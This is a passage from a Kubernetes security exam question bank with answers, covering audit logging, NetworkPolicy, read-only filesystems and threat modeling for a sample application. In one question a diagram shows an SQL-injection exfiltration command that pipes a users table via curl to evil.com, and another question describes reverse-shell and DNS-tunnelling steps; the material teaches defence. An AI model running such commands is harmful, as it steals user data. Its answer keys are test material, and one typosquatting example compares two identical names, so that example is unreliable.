  │ CAP_NET_RAW (⚠️ sniff!)   │        │ • Kill other processes     │
  │ CAP_SYS_CHROOT             │        │ • Sniff network traffic    │
  │ CAP_MKNOD                  │        │ • Modify kernel (sys_admin)│
  │ CAP_AUDIT_WRITE            │        │ • Trace other processes    │
  │ CAP_SETFCAP                │        │ • Change UID/GID           │
  │ ...                        │        │                            │
  └────────────────────────────┘        └────────────────────────────┘
  15 attack vectors available           Only 1 capability, justified

For anihpj/jobpost: The gunicorn container adds only NET_BIND_SERVICE (port 8000). The PostgreSQL container adds nothing (it doesn't need even NET_BIND_SERVICE — the connection is outbound to port 5432, already listening). The web (nginx) container adds NET_BIND_SERVICE (port 80). No container has NET_RAW (packet sniffing) or SYS_PTRACE (debug other processes).

Security Fundamentals Q107 of 200
What is the purpose of readOnlyRootFilesystem: true?
A) It makes all volumes in the pod read-only — including PersistentVolumes
B) Makes the container's root filesystem READ-ONLY — attacker can't write malware, modify binaries, or install backdoors. Mount /tmp as emptyDir and /var/lib/data as volumes for paths that need writes. Catches misconfigured apps that write to unexpected locations
C) It prevents all I/O — the container can't read or write anything
D) It only applies to the /etc directory for configuration protection
✅ Correct Answer: B

readOnlyRootFilesystem: true makes the container's root filesystem immutable. An attacker who gains code execution cannot write malware to disk, modify system binaries, or install backdoors. Apps that need to write must use mounted volumes (emptyDir for /tmp, PersistentVolumeClaim for data). This also acts as a configuration hygiene check — if your app crashes because it tries to write to /etc/myapp/cache, you learn about that bad pattern at deploy time (not when an attacker exploits it).

📝 Detailed Explanation
readOnlyRootFilesystem — Immutable Container
  ┌──────────────────────────────────────────────────────────────┐
  │  CONTAINER FILESYSTEM (readOnlyRootFilesystem: true)         │
  │                                                              │
  │  /app/              ← READ ONLY (image layers)               │
  │  /usr/              ← READ ONLY                              │
  │  /bin/              ← READ ONLY (no binary modification)     │
  │  /lib/              ← READ ONLY                              │
  │  /etc/              ← READ ONLY (no config tampering)        │
  │                                                              │
  │  ⚠️ Attacker: "Let me write a backdoor to /usr/bin/..."     │
  │  → Read-only file system: Permission denied ✗               │
  │                                                              │
  │  ⚠️ Attacker: "Let me modify /etc/passwd..."                │
  │  → Read-only file system: Permission denied ✗               │
  │                                                              │
  │  ┌──────────────────────────────────────────────────────┐   │
  │  │ WRITABLE VOLUMES (explicitly mounted):                │   │
  │  │ /tmp/         ← emptyDir (ephemeral, safe)            │   │
  │  │ /var/lib/data ← PersistentVolumeClaim (your data)     │   │
  │  │ /var/run/     ← emptyDir (runtime sockets)            │   │
  │  └──────────────────────────────────────────────────────┘   │
  └──────────────────────────────────────────────────────────────┘

For anihpj/jobpost: All containers run with readOnlyRootFilesystem: true. Gunicorn writes to /tmp (emptyDir), Django media uploads go to a PersistentVolume (mounted at /var/lib/media), and Celery task results go to Redis (network, not filesystem). No container can write to its root filesystem — even with code execution in gunicorn, the attacker can't drop a webshell to /app/static/shell.php because /app is read-only.

3.7 Audit LoggingQ108–Q112

Security Fundamentals Q108 of 200
What is Kubernetes Audit Logging and why is it critical for security?
A) It logs container stdout/stderr output for debugging purposes
B) Records ALL API server requests: who did what, when, from where, and the result. Essential for incident investigation (who deleted production?), compliance (SOC2/GDPR proof), and detecting suspicious activity (who read all Secrets at 3 AM?). Without audit logs, a breach happens and you have NO IDEA what was accessed
C) It only records failed authentication attempts — not successful operations
D) Kubernetes has audit logging enabled by default — no configuration needed
✅ Correct Answer: B

Kubernetes Audit Logging is the API server's built-in logging of every request: who (user/SA), what (verb + resource), when (timestamp), from where (source IP), and the result (allowed/denied, response code). It's the equivalent of security camera footage for your cluster — without it, you're blind. Audit logs answer: "Who deleted the production deployment?", "Which SA read all Secrets at 2 AM?", "Who granted cluster-admin to a new user?"

📝 Detailed Explanation
Audit Log — The "Security Camera" of Your Cluster
  API SERVER ──► AUDIT LOG ──► LOG BACKEND (file, webhook)

  Sample audit event:
  ┌────────────────────────────────────────────────────────────┐
  │ {                                                          │
  │   "user": {"username": "alice@company.com"},               │
  │   "sourceIPs": ["10.0.1.5"],                               │
  │   "verb": "delete",                                        │
  │   "objectRef": {                                           │
  │     "resource": "deployments",                             │
  │     "name": "anihpj-api",                                  │
  │     "namespace": "anihpj"                                  │
  │   },                                                       │
  │   "responseStatus": {"code": 200},                         │
  │   "requestReceivedTimestamp": "2026-06-12T02:14:33Z",     │
  │   "stageTimestamp": "2026-06-12T02:14:33Z"                │
  │ }                                                          │
  │                                                            │
  │ ANSWER: Alice from 10.0.1.5 deleted anihpj-api deployment  │
  │ at 2:14 AM. Was this authorized? Check the change ticket.  │
  └────────────────────────────────────────────────────────────┘

For anihpj/jobpost: Audit logs are shipped to a SIEM (Splunk/Elastic) with alerts: "Secret read outside business hours", "cluster-admin binding created", "kubectl exec to production namespace". The audit policy logs Secret reads at RequestResponse level (captures which secret was accessed). All audit logs are stored off-cluster (S3) — if the cluster is destroyed, the logs survive.

Security Fundamentals Q109 of 200
What are the Kubernetes audit policy levels and when should you use each?
A) There are only two levels: On and Off
B) All audit events should be logged at RequestResponse level for maximum visibility — storage is cheap
C) None (don't log) → Metadata (who/what/when, no body) → Request (metadata + request body) → RequestResponse (metadata + request + response body — most verbose). Secrets reads at RequestResponse, RBAC changes at RequestResponse, pod exec at Metadata, GET pods at None to avoid noise
D) The levels are Debug, Info, Warning, and Error — same as standard logging
✅ Correct Answer: C

Audit policy levels control how MUCH of each request is logged. None: skip entirely (use for noisy GET /pods). Metadata: log who/what/when/result but NOT request/response body (good default). Request: include request body (useful for seeing what RBAC rule was created). RequestResponse: include both request AND response bodies (most verbose — use for Secret access tracking because you want to know WHICH secret was read). Choose strategically — RequestResponse on all requests generates massive log volumes.

📝 Detailed Explanation
Audit Policy Levels — Strategic Selection
  ┌─────────────────────────────────────────────────────────────────┐
  │ RESOURCE        │ VERB     │ LEVEL             │ RATIONALE      │
  ├─────────────────────────────────────────────────────────────────┤
  │ Secrets         │ get/list │ RequestResponse   │ Know WHICH     │
  │                 │          │                   │ secret read    │
  │ RBAC (*bindings │ create/  │ RequestResponse   │ See exact rule │
  │  *, roles)      │ update/  │                   │ changes        │
  │                 │ delete   │                   │                │
  │ Pods            │ exec/    │ Metadata          │ Know who got   │
  │                 │ attach/  │                   │ shell access   │
  │                 │ portfw   │                   │                │
  │ Deployments     │ delete   │ Request           │ See which depl │
  │                 │          │                   │ was deleted    │
  │ Pods            │ get/list │ None              │ Too noisy —    │
  │                 │          │                   │ every readiness│
  │                 │          │                   │ probe triggers │
  └─────────────────────────────────────────────────────────────────┘

  ⚠️ RequestResponse on ALL requests = massive log growth
  ⚠️ None on everything = blind during incident
  ✅ Strategic: RequestResponse on security-critical, Metadata default

For anihpj/jobpost: The audit policy logs Secret reads at RequestResponse, RBAC changes at RequestResponse, exec at Metadata, and regular pod reads at None. This balances security visibility with log storage costs — ~50MB/day instead of ~5GB/day if everything were RequestResponse.

Security Fundamentals Q110 of 200
What should you audit for security monitoring in a production cluster?
A) Only login failures — everything else is operational, not security-related
B) Everything — more data is always better for security
C) Only kubectl exec and port-forward — these are the only dangerous operations
D) Secret reads (who accessed credentials?), RBAC changes (who added admin?), pod exec/portforward (who got shell access?), auth failures (brute force attempt?), namespace create/delete, NetworkPolicy modifications, and PodSecurity admission violations
✅ Correct Answer: D

Security-relevant audit events cover the kill chain: credential access (Secret reads), privilege escalation (RBAC changes), execution (pod exec), defense evasion (audit policy changes, delete Falco rules), discovery (list all namespaces), and lateral movement (access resources in other namespaces). Focus your audit policy on these high-value events — they tell the story of an attack in progress. Auth failures in particular may indicate credential brute-forcing.

📝 Detailed Explanation
Audit Monitoring — Mapping Events to the Kill Chain
  KILL CHAIN STAGE       AUDIT EVENT TO WATCH          ALERT THRESHOLD
  ─────────────────────  ────────────────────────────  ────────────────
  Reconnaissance         list secrets across all ns    ANY (unusual)
  Credential Access      get secret in production ns   Outside biz hrs
  Privilege Escalation   create clusterrolebinding     ALWAYS alert
                         with cluster-admin
  Execution              create pod with --privileged  ALWAYS alert
                         kubectl exec into prod pod    Outside biz hrs
  Defense Evasion        delete/modify audit policy    ALWAYS alert
                         delete NetworkPolicy          ALWAYS alert
  Lateral Movement       get pods in another ns        Cross-namespace
  Exfiltration           Large GET response on Secret  Threshold >1MB
  Impact                 delete deployment/namespace   Production ns

For anihpj/jobpost: SIEM alerts trigger on: any cluster-admin binding creation (immediate Slack + PagerDuty), Secret reads in anihpj namespace outside 8am-6pm, any kubectl exec to production pods, and RBAC changes in any namespace. These are reviewed daily by the security team.

Security Fundamentals Q111 of 200
How do you investigate "who deleted the production Deployment at 3 AM"?
A) Query audit logs: filter by resource=deployments, verb=delete, namespace=anihpj, time window around 3 AM. Result shows user, source IP, user agent. Then verify: was this an authorized change? Check the change management system. Correlate with cloud audit logs (CloudTrail) for IAM context
B) Check kubectl history on your laptop — it's probably there
C) Ask everyone on the team who might have done it — someone will remember
D) Deployments can't be deleted — they're managed by controllers
✅ Correct Answer: A

Audit log investigation follows the who → what → when → where → why pattern. Filter audit events for the specific resource, verb, and namespace in the time window. The event will show the username (e.g., alice@company.com or system:serviceaccount:ci-cd:deployer), source IP, and user agent (kubectl/v1.30, CI/CD tool). Then verify: was this an authorized change ticket? If the SA "ci-cd:deployer" did it, check the CI/CD pipeline logs. Correlate with CloudTrail to see if IAM credentials were used to access the cluster.

📝 Detailed Explanation
Incident Investigation — Tracing the Delete
  ┌────────────────────────────────────────────────────────────────┐
  │  STEP 1: Query audit logs                                      │
  │  ─────────────────────────                                    │
  │  $ cat audit.log | jq 'select(.objectRef.resource=="deployments"│
  │    and .verb=="delete" and .objectRef.namespace=="anihpj"      │
  │    and .stageTimestamp > "2026-06-12T02:45:00Z")'              │
  │                                                                │
  │  Result:                                                       │
  │  {                                                             │
  │    "user": "system:serviceaccount:ci-cd:deployer",            │
  │    "sourceIPs": ["10.0.3.42"],                                 │
  │    "userAgent": "jenkins/2.452.1",                            │
  │    "objectRef": {"name": "anihpj-api", "namespace": "anihpj"},│
  │    "stageTimestamp": "2026-06-12T03:02:15Z"                   │
  │  }                                                             │
  │                                                                │
  │  STEP 2: Check CI/CD logs → Jenkins job #1447 triggered it    │
  │  STEP 3: Check change ticket → Was this scheduled?            │
  │  STEP 4: Check CloudTrail → Who assumed the CI/CD IAM role?   │
  │  STEP 5: Conclusion: Authorized deployment rollback, but      │
  │           operator ran "delete" instead of "rollout undo"     │
  └────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: Audit logs are centralized in Elasticsearch with a 90-day retention. The security runbook includes exact jq/opensearch queries for common investigations: "who deleted X", "who read Secrets", "who created RBAC bindings". Every operator is trained to run these queries during incident response.

Security Fundamentals Q112 of 200
What is the difference between Kubernetes audit logs and cloud audit logs (CloudTrail/ Azure Monitor/ Cloud Audit Logs)?
A) They are the same thing — both capture the same events
B) K8s audit logs capture WHAT happened INSIDE the cluster (kubectl commands, API requests, pod exec). Cloud audit logs capture WHAT happened at the CLOUD level (IAM role changes, who created the EKS cluster, who modified KMS keys). BOTH are needed for complete visibility — cloud audit catches IAM policy changes; K8s audit catches kubectl commands inside the cluster
C) Cloud audit logs are more important — Kubernetes audit logs are optional
D) Kubernetes audit logs are a subset of cloud audit logs
✅ Correct Answer: B

K8s audit logs and cloud audit logs cover DIFFERENT layers of the stack. Cloud audit captures infrastructure-level events: "Who created this EKS cluster?", "Who attached this IAM policy?", "Who modified this KMS key?". K8s audit captures cluster-internal events: "Who ran kubectl delete deployment?", "Who read these Secrets?", "Who created this ClusterRole?". For complete visibility, you need BOTH. Example: CloudTrail shows Alice assumed the admin IAM role at 3 AM, and K8s audit shows that role then deleted all production namespaces.

📝 Detailed Explanation
Two Layers of Audit — Cloud + Kubernetes
  ┌─────────────────────────────────────────────────────────────────┐
  │                    CLOUD AUDIT (CloudTrail/Azure/Cloud Audit)   │
  │  ┌───────────────────────────────────────────────────────────┐  │
  │  │ • Who created the EKS/AKS/GKE cluster?                    │  │
  │  │ • Who modified the IAM role attached to worker nodes?     │  │
  │  │ • Who rotated the KMS key used for etcd encryption?       │  │
  │  │ • Who opened port 6443 in the security group?             │  │
  │  │ • Who downloaded the kubeconfig from the cloud console?   │  │
  │  └───────────────────────────────────────────────────────────┘  │
  │                              │                                   │
  │                              ▼                                   │
  │                    KUBERNETES AUDIT                               │
  │  ┌───────────────────────────────────────────────────────────┐  │
  │  │ • Who ran "kubectl delete deployment anihpj-api"?         │  │
  │  │ • Who listed all Secrets in the production namespace?     │  │
  │  │ • Who created a ClusterRoleBinding with cluster-admin?    │  │
  │  │ • Who exec'd into the anihpj-db pod?                      │  │
  │  │ • Who modified the NetworkPolicy to allow 0.0.0.0/0?     │  │
  │  └───────────────────────────────────────────────────────────┘  │
  └─────────────────────────────────────────────────────────────────┘

  CORRELATION EXAMPLE:
  CloudTrail:  alice@corp.com assumed EKSAdminRole at 03:00 UTC
  K8s audit:   EKSAdminRole deleted "anihpj-api" deployment at 03:02
  → Alice used her cloud IAM role to access and sabotage the cluster

For anihpj/jobpost: Both CloudTrail and K8s audit logs stream to the same SIEM. Correlated dashboards show: "IAM role X was assumed → this kubeconfig was used → these kubectl commands were run." This end-to-end traceability is critical for compliance (SOC2 requires knowing who accessed what data).

3.8 Network PolicyQ113–Q116

Security Fundamentals Q113 of 200
What problem does a NetworkPolicy solve in Kubernetes?
A) It encrypts network traffic between pods
B) It replaces the need for a CNI plugin — NetworkPolicy handles all networking
C) By default, ALL pods can communicate with ALL other pods across ALL namespaces. A compromised web pod can connect directly to the database. NetworkPolicy creates an internal firewall: "web pods can ONLY talk to api pods on port 8000." It restricts lateral movement after a compromise — defense-in-depth at the network layer
D) It only controls external (internet) traffic — internal pod traffic is always allowed
✅ Correct Answer: C

Kubernetes has an "allow-all" default — every pod can talk to every other pod across all namespaces. This is the OPPOSITE of Zero Trust. NetworkPolicy creates microsegmentation: define exactly which pods can talk to which other pods on which ports. Without NetworkPolicy, a compromised web pod can connect directly to your database, redis, or any other service. With NetworkPolicy, the attacker is trapped in the web pod — they can only reach explicitly allowed destinations.

📝 Detailed Explanation
Without vs With NetworkPolicy — Lateral Movement
  WITHOUT NetworkPolicy (DEFAULT):        WITH NetworkPolicy (ZERO TRUST):
  ┌────────┐                              ┌────────┐
  │anihpj- │──► anihpj-db:5432 ✓         │anihpj- │──► anihpj-db:5432 ✓
  │  web   │──► anihpj-redis:6379 ✓      │  web   │──► anihpj-redis:6379 ✗
  │  😈    │──► kube-system pods ✓       │  😈    │──► kube-system pods  ✗
  │comprom │──► other tenants' DBs ✓     │comprom │──► other tenants' DBs ✗
  │        │──► internet (exfil!) ✓      │        │──► internet (exfil!) ✗
  └────────┘                              └────────┘
  BLAST RADIUS: 💥 entire cluster          BLAST RADIUS: 🎯 web pod only

  Only explicitly ALLOWED connections work.
  Everything else: DENIED.

For anihpj/jobpost: The NetworkPolicy design is: default-deny all ingress + egress → allow web→api:8000 → allow api→db:5432 → allow api→redis:6379 → allow all→DNS (UDP 53 to CoreDNS). The web pod can ONLY reach the API on port 8000. Even if compromised, the attacker can't directly access the database, redis, other namespaces, or the internet — they must go through the API's application logic.

Security Fundamentals Q114 of 200
What does a "default-deny all ingress" NetworkPolicy look like?
A) podSelector: {} (selects ALL pods in the namespace), policyTypes: [Ingress], and NO ingress rules at all — this makes the namespace a black hole: ALL incoming traffic is denied. Then you ADD specific policies to allow needed traffic. This is Zero Trust networking: deny everything, explicitly allow only what's needed
B) Delete all NetworkPolicies — Kubernetes defaults to deny-all
C) Set podSelector to an impossible label match so no pods are affected
D) Add ingress rules with ipBlock: 0.0.0.0/0 except your IP
✅ Correct Answer: A

A default-deny policy uses podSelector: {} (empty selector = matches ALL pods in the namespace) with policyTypes: [Ingress] and no ingress rules. Since no rules allow traffic, all ingress is denied. This is the foundation of Zero Trust networking. Then you layer on specific allow policies: "allow from web pods on port 8000", "allow from monitoring namespace on port 9090". The combination of default-deny + specific allows = only intended traffic flows through.

📝 Detailed Explanation
Layered NetworkPolicy — Default-Deny + Specific Allows
  LAYER 1: Default-Deny (applied FIRST)
  ┌─────────────────────────────────────────────────┐
  │ apiVersion: networking.k8s.io/v1                │
  │ kind: NetworkPolicy                             │
  │ metadata:                                       │
  │   name: default-deny-ingress                    │
  │   namespace: anihpj                             │
  │ spec:                                           │
  │   podSelector: {}          ← ALL pods in ns     │
  │   policyTypes:                                  │
  │   - Ingress                                     │
  │   # NO ingress rules = DENY ALL                 │
  └─────────────────────────────────────────────────┘

  LAYER 2: Allow web → api (applied SECOND)
  ┌─────────────────────────────────────────────────┐
  │ spec:                                           │
  │   podSelector:                                  │
  │     matchLabels:                                │
  │       app: anihpj-api      ← applies to api pods│
  │   policyTypes:                                  │
  │   - Ingress                                     │
  │   ingress:                                      │
  │   - from:                                       │
  │     - podSelector:                              │
  │         matchLabels:                            │
  │           app: anihpj-web  ← allow from web     │
  │     ports:                                      │
  │     - port: 8000           ← only this port     │
  └─────────────────────────────────────────────────┘

  RESULT: api pods receive traffic ONLY from web pods on port 8000.
          All other traffic: DENIED by the default-deny policy.

For anihpj/jobpost: Every namespace has a default-deny-ingress policy as the first deployed resource. The k8s/12-networkpolicy.yaml manifest contains: ① default-deny ingress, ② allow web→api:8000, ③ allow api→db:5432, ④ allow api→redis:6379, ⑤ allow DNS (UDP 53). This is 5 NetworkPolicy objects that together implement Zero Trust networking for the application.

Security Fundamentals Q115 of 200
What's the difference between podSelector, namespaceSelector, and ipBlock in a NetworkPolicy?
A) They are interchangeable — pick whichever is easiest to write
B) podSelector is for ingress only; namespaceSelector is for egress only; ipBlock is for both
C) Only ipBlock works — pod labels are unreliable for network security
D) podSelector matches pods by LABEL within the same or other namespaces (identity-based, survives pod IP changes); namespaceSelector matches ALL pods in a namespace by label; ipBlock matches by CIDR range with optional exceptions (IP-based, useful for external services). All three can be combined in a single ingress/egress rule for layered filtering
✅ Correct Answer: D

NetworkPolicy selectors work at different levels of abstraction. podSelector is identity-based (label app=api) — it follows pods as they restart with new IPs. namespaceSelector is namespace-level (team=frontend) — allows/denies ALL pods in matching namespaces. ipBlock is CIDR-based (10.0.0.0/8 except 10.0.1.0/24) — useful for external services that don't have Kubernetes labels. The power comes from COMBINING them: "allow from pods labeled app=monitoring in namespaces labeled env=prod on port 9090."

📝 Detailed Explanation
Three Ways to Select Traffic — Combined Power
  ┌──────────────────────────────────────────────────────────────────┐
  │  podSelector                namespaceSelector      ipBlock       │
  │  ───────────                ─────────────────      ───────       │
  │  Matches: Pod LABELS        Matches: NS LABELS     Matches: CIDR │
  │  Example: app=anihpj-api    Example: env=prod      Ex: 10.0/8    │
  │  Strength: Identity-based   Strength: Org-based    Strength: IP  │
  │  Survives pod restarts ✓    Survives ns changes ✓  Fixed address │
  │  Use for: App microseg      Use for: Multi-tenant  Use for: Ext  │
  │                                                      services    │
  └──────────────────────────────────────────────────────────────────┘

  COMBINED EXAMPLE:
  ingress:
    - from:
      - podSelector:           ← Pods labeled app=monitoring
          matchLabels:
            app: monitoring
        namespaceSelector:     ← AND in namespaces labeled env=prod
          matchLabels:
            env: prod
      - ipBlock:               ← OR from the CI/CD subnet
          cidr: 10.0.3.0/24
          except:              ← EXCEPT this specific IP
          - 10.0.3.99/32
      ports:
      - port: 9090
        protocol: TCP

For anihpj/jobpost: The api→db:5432 rule uses podSelector (app=anihpj-api → app=anihpj-db). The monitoring ingress rule uses namespaceSelector (env=monitoring → anihpj namespace). The egress-to-external-registry rule uses ipBlock (ECR's CIDR range). Each selector type is chosen based on the traffic source/destination's nature.

Security Fundamentals Q116 of 200
For anihpj-db (PostgreSQL), should you set an egress NetworkPolicy? Why?
A) No — databases don't make outbound connections, so egress rules are unnecessary
B) YES — defense-in-depth. PostgreSQL only needs DNS (UDP 53 to CoreDNS) and maybe NTP. DEFINITELY NOT internet access. With restrictive egress, even if an attacker gets code execution via SQL injection (e.g., COPY ... TO PROGRAM), they can't exfiltrate data to an external server. The data is TRAPPED inside the cluster
C) Only if PostgreSQL is configured to replicate to an external server
D) Egress policies are a CNI-level feature — not related to NetworkPolicy
✅ Correct Answer: B

Egress NetworkPolicy is data exfiltration prevention. PostgreSQL usually doesn't need outbound internet — it receives queries, stores data, and that's it. But if an attacker exploits SQL injection and uses PostgreSQL's COPY ... TO PROGRAM to execute shell commands, they'll try to exfiltrate data via curl/wget to an external server. An egress deny-all policy blocks this — the database can receive connections but can't reach out. The data is trapped. Always restrict egress to the minimum: DNS (UDP 53) and maybe NTP (UDP 123).

📝 Detailed Explanation
Egress NetworkPolicy — Data Exfiltration Prevention
  WITHOUT EGRESS POLICY:                  WITH EGRESS POLICY:
  ┌──────────────────────────┐           ┌──────────────────────────┐
  │ anihpj-db (PostgreSQL)   │           │ anihpj-db (PostgreSQL)   │
  │                          │           │                          │
  │ Attacker via SQLi:       │           │ Attacker via SQLi:       │
  │ COPY (SELECT * FROM      │           │ COPY (SELECT * FROM      │
  │   users) TO PROGRAM      │           │   users) TO PROGRAM      │
  │   'curl -X POST          │           │   'curl -X POST          │
  │    https://evil.com/     │           │    https://evil.com/     │
  │    -d @-'                │           │    -d @-'                │
  │                          │           │                          │
  │ curl → evil.com ✓        │           │ curl → evil.com ✗        │
  │ ALL USER DATA STOLEN! 💥 │           │ Egress DENIED by NP      │
  └──────────────────────────┘           │ Data is TRAPPED! 🔒      │
                                         └──────────────────────────┘

  EGRESS POLICY (applied to anihpj-db):
  ┌──────────────────────────────────────────────────────────────┐
  │ egress:                                                      │
  │ - to:                                                        │
  │   - namespaceSelector:                                       │
  │       matchLabels:                                           │
  │         kubernetes.io/metadata.name: kube-system             │
  │     podSelector:                                             │
  │       matchLabels:                                           │
  │         k8s-app: kube-dns                                    │
  │   ports:                                                     │
  │   - port: 53                                                 │
  │     protocol: UDP                                            │
  │ # That's it. NO other egress. No internet, no other pods.    │
  └──────────────────────────────────────────────────────────────┘

For anihpj/jobpost: The PostgreSQL StatefulSet has an egress NetworkPolicy allowing ONLY DNS (UDP 53 to CoreDNS). No internet, no other pods, no cloud metadata endpoint. Even if an attacker compromises the database through SQL injection, they cannot exfiltrate user PII to an external server — the data is locked in the cluster. Combined with ingress allowing only api→db:5432, the database is in a network "safe room."

☠️ Category 4: Kubernetes Threat Model (16%)Q117-Q148

🟣 Advanced: Thinking Like an Attacker to Defend Better

This category is about understanding the adversary — trust boundaries, persistence mechanisms, denial of service, malicious code execution, network attacks, data access threats, and privilege escalation paths. You'll learn to map MITRE ATT&CK techniques to Kubernetes and trace attack kill chains through the anihpj/jobpost cluster.

Q117-Q148 32 Questions 🟣 Advanced

4.1 Trust Boundaries & Data FlowQ117–Q121

Threat Model Q117 of 200
What is the MITRE ATT&CK framework and how does it apply to Kubernetes security?
A) MITRE ATT&CK is a vulnerability database like CVE — it lists specific software bugs
B) It's a compliance framework like PCI-DSS — you check boxes to become "ATT&CK certified"
C) A globally-accessible knowledge base of adversary TACTICS and TECHNIQUES based on real-world observations. For Kubernetes, it maps specific attack techniques to the container lifecycle: Initial Access → Execution → Persistence → Privilege Escalation → Defense Evasion → Credential Access → Discovery → Lateral Movement → Collection → Exfiltration → Impact
D) MITRE ATT&CK only applies to traditional IT — it has no Kubernetes-specific content
✅ Correct Answer: C

MITRE ATT&CK is a knowledge base of adversary behavior — not vulnerabilities, not compliance. It documents the TTPs (Tactics, Techniques, Procedures) that real attackers use. For Kubernetes/containers, it maps the complete kill chain: how attackers gain initial access (exposed dashboard, compromised image), execute code, persist (backdoor SA), escalate privileges (container escape), evade defenses (delete audit logs), steal credentials, move laterally, and exfiltrate data. KCSA expects you to understand the framework conceptually, not memorize technique IDs.

📝 Detailed Explanation
MITRE ATT&CK — Kubernetes Kill Chain
  ┌──────────────────────────────────────────────────────────────────────┐
  │ TACTIC              │ KUBERNETES TECHNIQUE                           │
  ├──────────────────────────────────────────────────────────────────────┤
  │ Initial Access      │ Compromised image in registry, exposed dashboard│
  │ Execution           │ kubectl exec, deploy malicious pod, sidecar     │
  │ Persistence         │ Backdoor ServiceAccount, writable hostPath, cron│
  │ Privilege Escalation│ Container escape, privileged pod, host mount    │
  │ Defense Evasion     │ Clear logs, disable audit, delete Falco rules   │
  │ Credential Access   │ Read mounted Secrets, steal SA tokens, etcd dump│
  │ Discovery           │ List pods/namespaces, check cloud metadata API  │
  │ Lateral Movement    │ Use stolen SA token to access other namespaces  │
  │ Collection          │ Access database from compromised API pod        │
  │ Exfiltration         │ DNS tunneling, HTTPS to C2, cloud storage API  │
  │ Impact              │ Delete data, cryptomining, resource hijacking   │
  └──────────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: The security team maps every Falco alert, audit log anomaly, and SIEM correlation to a MITRE ATT&CK technique. "Unexpected outbound connection from anihpj-api" → maps to Exfiltration (T1048). "New ClusterRoleBinding with cluster-admin" → maps to Persistence (T1098). This mapping helps prioritize response: Exfiltration = P1 (data leaving!), Discovery = P3 (reconnaissance, but no damage yet).

Threat Model Q118 of 200
What is threat modeling and what are its core questions?
A) Running a vulnerability scanner against your cluster — it's an automated process
B) The process of identifying WHAT you're protecting (crown jewels), WHO might attack (threat actors), HOW they would attack (attack vectors), and WHAT you'll do about it (controls). Core questions: What are we building? What can go wrong? What are we going to do about it? Did we do a good job?
C) A compliance requirement — you only need to document it for auditors
D) A tool like Trivy that scans container images for known CVEs
✅ Correct Answer: B

Threat modeling is a structured thinking process, not a tool. It answers four questions: ① What are we building? (system architecture, data flows, trust boundaries), ② What can go wrong? (threats — STRIDE categories: Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation), ③ What are we going to do about it? (controls — NetworkPolicy, RBAC, encryption), ④ Did we do a good job? (validation — audit, pen testing, bug bounty). KCSA tests the PROCESS, not formal methodologies.

📝 Detailed Explanation
Threat Modeling — The 4 Questions
  ┌────────────────────────────────────────────────────────────────┐
  │  ① WHAT ARE WE BUILDING?                                       │
  │  ┌──────────────────────────────────────────────────────────┐  │
  │  │ anihpj/jobpost: web → api → db, api → redis              │  │
  │  │ Trust boundaries: internet ↔ ingress, ingress ↔ web,     │  │
  │  │ web ↔ api, api ↔ db, api ↔ redis                        │  │
  │  │ Crown jewels: user PII (db), SECRET_KEY (Secrets),       │  │
  │  │ JWT tokens, payment data                                 │  │
  │  └──────────────────────────────────────────────────────────┘  │
  │                                                                │
  │  ② WHAT CAN GO WRONG?                                          │
  │  • Spoofing: Stolen kubeconfig → impersonate admin             │
  │  • Tampering: Malicious image replaces anihpj-api              │
  │  • Repudiation: Attacker deletes audit logs                    │
  │  • Info Disclosure: Secrets read from etcd (not encrypted)     │
  │  • DoS: Resource exhaustion — pod with no limits               │
  │  • Elevation: Container escape via privileged pod              │
  │                                                                │
  │  ③ WHAT ARE WE GOING TO DO?                                    │
  │  • OIDC + MFA (anti-spoofing), Cosign (anti-tampering)        │
  │  • Audit log shipping (anti-repudiation), etcd encryption      │
  │  • ResourceQuota (anti-DoS), Pod Security Standards (anti-EoP) │
  │                                                                │
  │  ④ DID WE DO A GOOD JOB?                                       │
  │  • Penetration test results, kube-bench score, audit review   │
  └────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: The team runs a threat modeling session before every major release. They walk through the data flow diagram, identify new trust boundaries, and update controls. The output feeds directly into the security backlog: "High: Implement egress NetworkPolicy on DB tier to prevent exfiltration."

Threat Model Q119 of 200
Trace a potential attack on anihpj/jobpost from initial access to data exfiltration using the kill chain model.
A) Direct internet access to the database — no intermediate steps needed
B) SSH into the node → access the container filesystem — that's it
C) Kubernetes has no attack surface — containers are fully isolated
D) ① Initial Access: Malicious image uploaded as "anihpj-api:v2" on Docker Hub (typosquatting) → dev pulls it → ② Execution: Image starts reverse shell alongside gunicorn → ③ Discovery: curl Kubernetes API with mounted SA token → lists pods → ④ Lateral: Connects to anihpj-db:5432 with env var credentials → ⑤ Collection: Dumps all user data → ⑥ Exfiltration: DNS tunneling through CoreDNS to attacker's nameserver → Defense at EACH step: image signing, Falco detection, RBAC, NetworkPolicy, egress deny
✅ Correct Answer: D

This is a realistic kill chain scenario. The attacker uses typosquatting (anihpj-api vs anihpj-api) to trick a developer. The malicious image runs a reverse shell. From there: SA token discovery → lateral movement to database → data collection → DNS exfiltration. Defense at each step matters: Cosign would block the unsigned image, Falco would detect the reverse shell, RBAC would block API discovery, NetworkPolicy would trap the attacker, and egress deny would prevent exfiltration. Defense-in-depth means the attacker must defeat ALL controls to succeed.

📝 Detailed Explanation
Kill Chain — Attack vs Defense at Each Stage
  STAGE              ATTACKER ACTION              DEFENSE (if configured!)
  ─────────────────  ───────────────────────────  ─────────────────────────
  ① Initial Access   Push "anihpj-api:v2"         Cosign: unsigned → REJECT
                     to Docker Hub (typosquat)    OPA: not in allowed reg → REJECT

  ② Execution        Reverse shell to evil.com    Falco: unexpected outbound
                     connects on container start  → alert + kill pod

  ③ Discovery        curl k8s API with SA token   RBAC: SA has NO API access
                     GET /api/v1/namespaces/...   → 403 Forbidden

  ④ Lateral Move     Connect to anihpj-db:5432    NetworkPolicy: only api pod
                     with env var credentials     can reach db → if from wrong
